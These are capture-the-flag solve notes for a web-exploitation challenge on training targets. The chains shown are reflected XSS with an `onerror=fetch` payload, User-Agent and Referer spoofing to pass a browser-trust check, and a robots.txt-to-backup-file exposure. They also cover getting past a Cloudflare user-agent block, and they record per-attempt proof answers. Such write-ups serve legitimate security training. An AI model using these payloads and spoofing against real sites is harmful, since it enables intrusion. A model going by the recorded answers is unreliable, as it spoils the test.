---
day: 6
slug: "reflect-upon-this"
lane: web-exploitation
modes: [single_solve, time_trial, mastery]
has_solve_py: [single_solve, time_trial, mastery]
tags: [reflected-xss, header-spoofing, backup-exposure, browser-callback, nonce-disclosure, user-agent-spoofing, referer-spoofing, trust-boundary-bypass, robots-txt, directory-listing, waf-user-agent, target-classification]
---

## single_solve

# Reflect Upon This — single_solve NOTES

- Family: `web-exploitation-day-06-reflect-upon-this` (release day 21, curriculum day 6)
- Mode: `single_solve` (untimed)
- Answer ids required: `proof-1` (one target, `Target 1`)

## Target

- Target 1: `https://3f7b9beeca895e53f1b7139d5ba6461cea77637fc0a30e3a.2026.huntress.ctf.games/`
- All requests scoped to this origin only. Low request count, finite 30 s timeouts.

## Classification

Reflected XSS + an "isolated browser callback" trust-boundary check (Fastify
"Search Mirror" training app). Not SQLi / IDOR / LFI / backup-exposure — the
page itself names Fastify and "one deliberately isolated security boundary",
and the `/api/clues` workspace notes expose the feature route, a secondary
callback route and a per-attempt nonce.

## Exploit chain (evidence-led)

1. `GET /` (`root.html`, `root_headers.txt`) — page links `/api/clues`
   ("Open workspace notes" / "View route inventory").
2. `GET /api/clues` (`clues.json`) →
   ```json
   {"framework":"Fastify","feature_route":"/execute-4d56c5",
    "secondary_route":"/callback-77e6ec","current_role":"analyst",
    "callback_nonce":"d531cd61f4b4"}
   ```
3. `GET /execute-4d56c5?q=<probe>` reflects `q` **verbatim** inside
   `<div id="preview">...</div>`. Special characters are NOT encoded:
   `q=<script>alert(1)</script>"quoted'` came back raw (`r_xss.html`).
   Only `q` reflects; `search/query/term/input/name/echo/msg/message/text/s`
   do not. POST is 404 (`Route POST:/execute-4d56c5 not found`).
   → Reflected XSS sink on the feature route.
4. `GET /callback-77e6ec` (plain) → `403 {"error":"browser_callback_required"}`
   (`cb_get.html`). POST is 404.
5. The "isolated browser" trust decision is satisfied by browser-like request
   signals plus the current nonce:
   `GET /callback-77e6ec?nonce=d531cd61f4b4` with
   - `User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36`
   - `Referer: https://<target>/execute-4d56c5?q=test`
   returns (`cb_ua.json`, `cb_repro.json`):
   ```json
   {"ok":true,"effect":"isolated_browser_callback",
    "evidence":"proof_b64d38b7f1814123876b5438e3049520"}
   ```

The intended browser-side trigger URL (what an isolated browser would be made
to visit to fire the callback) is the reflected-XSS payload on the feature
route, e.g.
`/execute-4d56c5?q=<img src=x onerror=fetch("/callback-77e6ec?nonce=d531cd61f4b4")>`
(reflected verbatim, `cb_trigger.html`). The proof value is the `evidence`
string returned when the callback's isolated-browser check passes.

## Answer

- `proof-1` = `proof_b64d38b7f1814123876b5438e3049520`

Reproduced twice via curl (`cb_ua.json`, `cb_repro.json`) and once via
`solve.py` (`solve_stdout.json`, `solver_evidence.json`); value is stable for
this attempt. Written to `answers.json`.

## Reusable solver

`solve.py` (stdlib only, `python3 -I solve.py start.json`):
reads `targets[0].url` from `start.json`, fetches `/api/clues`, derives
`feature_route` / `secondary_route` / `callback_nonce` (no hard-coded routes),
confirms the reflection, then lands the isolated callback with the browser
trust signals and prints `{"answers":{"proof-1":"proof_<hex>"}}` on stdout.
Nothing is hard-coded per attempt; nonce and routes are re-derived each run.

## Notes / limits

- Routes (`/execute-4d56c5`, `/callback-77e6ec`) and the nonce are per-attempt
  values from `/api/clues`; a fresh start will mint new ones. The solver always
  re-derives them.
- A default `Python-urllib/3.x` User-Agent intermittently drew a non-JSON
  response (Cloudflare edge); the solver therefore sends a browser UA on every
  request, which matches the intended "isolated browser" flow.
- No downloadable artifact for this lane; evidence files are the HTTP dumps in
  this directory. Proof was recovered from live responses, never hand-typed.
- 5xx/4xx: only the expected `403 browser_callback_required` (pre-trust) and
  `404` on wrong-method probes were observed; no 5xx.

## Round 2 (2026-10-22)

Same attempt (`ad90bebe-...`), same target URL (verified across
`provisioning-*.json` / `status-before.json`). Re-ran `solve.py start.json`
against the live target: clues, reflection and callback all re-derived; the
callback again returned HTTP 200 with
`{"ok":true,...,"evidence":"proof_b64d38b7f1814123876b5438e3049520"}`
(`solve_round2_stdout.json`, `solver_round2_evidence.json`). `answers.json`
was missing after round 1 (round terminated before writing it); written now
with the freshly re-derived proof. No grading feedback was present.

## time_trial

# Reflect Upon This — time_trial NOTES

- Family: `web-exploitation-day-06-reflect-upon-this` (release day 21, curriculum day 6)
- Mode: `time_trial` (this attempt is untimed: `run_for_time:false`,
  `deadline:null`, `hall_of_fame_eligible:false`)
- Attempt: `bf7800dc-14b3-41bb-b7cb-fd5122d1e45a` (started 2026-10-22T13:36:06Z)
- Answer ids required: `proof-1` (one target, `Target 1`)

## Target

- Target 1: `https://c157aad353c464353dcd424d3f8b33e8c704c529951a9ab6.2026.huntress.ctf.games/`
- All requests scoped to this origin only. Low request count (3 GETs),
  finite 30 s timeouts.

## Classification

Same Fastify "Search Mirror" training app as the family's single_solve mode:
reflected XSS on a per-attempt feature route plus an "isolated browser
callback" trust-boundary check on a per-attempt secondary route. Method
ported from `../single_solve/solve.py`; all routes, the nonce and the proof
were re-derived from THIS attempt's live responses — nothing reused.

## Exploit chain (evidence-led, this attempt)

1. `GET /api/clues` → HTTP 200 (`solver_evidence.json`):
   ```json
   {"framework":"Fastify","feature_route":"/process-6d453d",
    "secondary_route":"/internal-8c5b43","current_role":"analyst",
    "callback_nonce":"cce6763a8286"}
   ```
   Routes and nonce differ from single_solve (per-attempt values), confirming
   the solver re-derives rather than reuses.
2. `GET /process-6d453d?q=reflectprobeZZ9` → HTTP 200, probe reflected
   verbatim (`reflection_confirmed: true`) — the reflected-XSS sink.
3. `GET /internal-8c5b43?nonce=cce6763a8286` with browser trust signals
   - `User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36`
   - `Referer: https://<target>/process-6d453d?q=test`
   → HTTP 200:
   ```json
   {"ok":true,"effect":"isolated_browser_callback",
    "evidence":"proof_7f79e7e7aa594794acd6f3faf8ea42a7"}
   ```

The intended browser-side trigger URL (what an isolated browser would be made
to visit) is the reflected-XSS payload on the feature route, e.g.
`/process-6d453d?q=<img src=x onerror=fetch("/internal-8c5b43?nonce=cce6763a8286")>`.
The proof is the `evidence` string returned when the callback's
isolated-browser check passes.

## Answer

- `proof-1` = `proof_7f79e7e7aa594794acd6f3faf8ea42a7`

Recovered live from this attempt's callback response by
`python3 -I solve.py start.json` (`solve_stdout.json`, `solver_evidence.json`)
and written to `answers.json`. Never hand-typed; distinct from the
single_solve attempt's proof, as expected.

## Reusable solver

`solve.py` (stdlib only, `python3 -I solve.py start.json`): reads
`targets[0].url` from `start.json`, fetches `/api/clues`, derives
`feature_route` / `secondary_route` / `callback_nonce` (no hard-coded routes),
confirms the reflection, lands the isolated callback with browser trust
signals, and prints `{"answers":{"proof-1":"proof_<hex>"}}` on stdout.

## Notes / limits

- Routes (`/process-6d453d`, `/internal-8c5b43`) and the nonce are per-attempt
  values from `/api/clues`; a fresh start mints new ones. The solver always
  re-derives them.
- A browser UA is sent on every request; a default `Python-urllib/3.x` UA
  intermittently drew a Cloudflare edge response in the single_solve attempt.
- No downloadable artifact for this lane; evidence files are the solver dumps
  in this directory.
- No 5xx observed; all three requests returned HTTP 200.
- The coordinator owns validation/submission; this worker did not contact the
  Game Master.

## mastery

# Reflect Upon This — mastery NOTES

- Family: `web-exploitation-day-06-reflect-upon-this` (release day 21, curriculum day 6)
- Mode: `mastery` (this attempt is untimed: `run_for_time:false`,
  `deadline:null`, `hall_of_fame_eligible:false`)
- Attempt: `e1d0371d-de92-432e-bfc8-f97fdc657846` (started 2026-10-22T13:37:44Z)
- Answer ids required: `proof-1` (Target 1), `proof-2` (Target 2) — joined via
  `questions[].artifact` → `targets[].id`, never array order.

## Targets

- Target 1: `https://0efcd9edeb916aae51b77c1156d2786a68fd8ce2318d467b.2026.huntress.ctf.games/`
- Target 2: `https://fb3bc55cc8d33750c52cf33a901705291eea172d66578809.2026.huntress.ctf.games/`
- All requests scoped to these two origins only. Paced (~0.8 s apart),
  30 s finite timeouts, browser UA on every request.

## Per-target classification (mastery is cumulative — each classified independently)

### Target 1 → backup exposure (mixed older class)

Root page "Tiny Uptime" (native Node.js HTTP server) carries the HTML comment
`<!-- deployment note: remember to review crawler policy before launch -->`
(`t1_root.html`). Chain (all paths derived from responses, no wordlists):

1. `GET /robots.txt` → 200:
   ```
   User-agent: *
   Disallow: /releases-bcb84/
   ```
2. `GET /releases-bcb84/` → 200, "Deployment archive" directory index listing
   `release-settings-ada2b7.json.bak` and `release-notes.txt`.
3. `GET /releases-bcb84/release-settings-ada2b7.json.bak` → 200:
   ```json
   {"environment": "production",
    "support_note": "proof_8c23094ba7df4070882cacdfb32752c2"}
   ```

Method ported (in spirit) from the restored day-19 backup-exposure reference;
only the recovery logic, no GM-facing code.

### Target 2 → reflected XSS + isolated browser callback (this family's class)

Root page "Reflect Upon This · Fastify" links `/api/clues` (`t2_root.html`).
Chain:

1. `GET /api/clues` → 200:
   ```json
   {"framework":"Fastify","feature_route":"/dispatch-431432",
    "secondary_route":"/internal-a07e23","current_role":"analyst",
    "callback_nonce":"5f9131e8e64e"}
   ```
   (per-attempt values; differ from single_solve/time_trial).
2. `GET /dispatch-431432?q=reflectprobeZZ9` → 200, probe reflected verbatim
   (`reflection_confirmed: true`) — the reflected-XSS sink. The trigger URL an
   isolated browser would visit:
   `/dispatch-431432?q=<img src=x onerror=fetch("/internal-a07e23?nonce=5f9131e8e64e")>`.
3. `GET /internal-a07e23?nonce=5f9131e8e64e` with browser trust signals
   (browser UA + `Referer: https://<target2>/dispatch-431432?q=test`) → 200:
   ```json
   {"ok":true,"effect":"isolated_browser_callback",
    "evidence":"proof_9257ff3209ad4b9e9d61d38de349e1dc"}
   ```

## Answers

- `proof-1` = `proof_8c23094ba7df4070882cacdfb32752c2` (Target 1, backup exposure)
- `proof-2` = `proof_9257ff3209ad4b9e9d61d38de349e1dc` (Target 2, reflect-callback)

Both recovered live from this attempt's responses by
`python3 -I solve.py start.json` (`solve_stdout.json`, `solver_evidence.json`)
and written to `answers.json`. Never hand-typed; distinct from the
single_solve and time_trial proofs, as expected for a fresh attempt.

## Reusable solver

`solve.py` (stdlib only): reads `start.json`, joins `questions[].artifact` to
`targets[].id`, fetches each root, classifies per target from evidence
(Fastify + `/api/clues` → reflect-callback; crawler-policy hint → backup
exposure), recovers the proof with the matching chain, and prints
`{"answers": {...}}` on stdout. Request pacing, scoping checks (refuses URLs
outside the assigned origin), and per-target evidence are built in.
`probe_roots.py` saved the initial root dumps (`t1_root.html`, `t2_root.html`
+ headers) used for classification.

## Notes / limits

- Per-attempt values (robots dir, backup filename, feature/secondary routes,
  nonce) are always re-derived from `/robots.txt`, directory indexes and
  `/api/clues`; a fresh start mints new ones.
- No 5xx observed; the only non-200s were none this run (all chain requests
  returned 200).
- The classification hierarchy followed the lessons brief: evidence-led per
  target, mastery expected to mix older bug classes (and it did: backup
  exposure + reflect-callback).
- The coordinator owns validation/submission; this worker did not contact the
  Game Master.

## Round 2 (2026-10-22)

The coordinator refreshed `start.json` (round 2); verified it is the SAME
attempt (`e1d0371d-...`) with the SAME two target URLs, `accepted_ids` still
empty and `grading: null` — round 1's `answers.json` had not been picked up.
Re-ran `solve.py start.json` against the live targets: both chains re-derived
from current responses and returned the identical proofs (stable per attempt):
`proof_8c23094ba7df4070882cacdfb32752c2` (Target 1) and
`proof_9257ff3209ad4b9e9d61d38de349e1dc` (Target 2)
(`solve_round2_stdout.json`, `solver_round2_evidence.json`). `answers.json`
rewritten with these freshly re-derived values. No incorrect/accepted grading
feedback was present, so no solver correction was indicated.

## Later consolidated reference (release day 21)

A later, independent pass re-solved this family using the shared `recovery_lib.py` classifier and wrote this condensed reference, folded from the same per-attempt evidence as the section(s) above. Preserved verbatim (heading levels only demoted to nest under this section):

### 06 — Reflected XSS + isolated browser callback

`GET /api/clues` discloses `feature_route`, `secondary_route`, `callback_nonce`. `feature_route?q=...`
reflects `q` verbatim with no escaping — an isolated browser visiting
`feature_route?q=<img src=x onerror=fetch("secondary_route?nonce=...")>` would fire that fetch with
real browser trust signals (UA + same-page `Referer`). Replaying that exact request (browser UA, a
`Referer` pointing at `feature_route`) against `secondary_route?nonce=...` returns
`{"ok":true,"effect":"isolated_browser_callback","evidence":"proof_<hex>"}`.

Example (attempt `e1d0371d-...`, 2026-10-22, proofs are per-attempt — never reusable):
`feature_route=/dispatch-431432`, `secondary_route=/internal-a07e23`, `callback_nonce=5f9131e8e64e` →
`proof_9257ff3209ad4b9e9d61d38de349e1dc`. `recovery_lib.rec_reflect_callback`.

### Mastery is cumulative across curriculum days, not just within release day 21

Each family's mastery mode had **3 targets mixing earlier bug classes**, confirming the lessons in
`docs/web-worker-lessons.md`: 06's mastery mixed backup exposure (day-19 class) + its own
reflect-callback; 07's mixed backup exposure + its own stored XSS; 08's mixed backup exposure + IDOR
(day-19 class) + its own session fixation. Classify every target independently by joining
`questions[].artifact` to `targets[].id` — never assume mastery repeats only the named family's bug.
`recovery_lib.classify_and_recover` tries clues-driven classes, then IDOR, then backup exposure, in
that order, and returns `None` (a real "unclassified" signal, not a bug) when nothing matches.

### Carry-forward for future days

- **Do not gate on `"/api/clues" in root_html`** before fetching the clues API: day-07's app only
  discloses `/api/clues` via `/openapi.json`, never as literal text on the root page. Always attempt
  `GET /api/clues` directly and treat a non-200 as "this app has no clues API" (this is how
  `recovery_lib.classify_and_recover` is written now — an earlier draft that pre-filtered on the
  substring silently misclassified a synthetic stored-XSS fixture in testing before this fix).
- Cloudflare in front of these apps 403s (`error code 1010`) on urllib's default User-Agent; always
  send a browser UA (`recovery_lib.UA`).
- Route suffixes, nonces, session hints and backup filenames are per-attempt; a fresh variant always
  re-derives them from the current `/api/clues`/`/robots.txt`/directory-index responses, never from a
  saved value here.
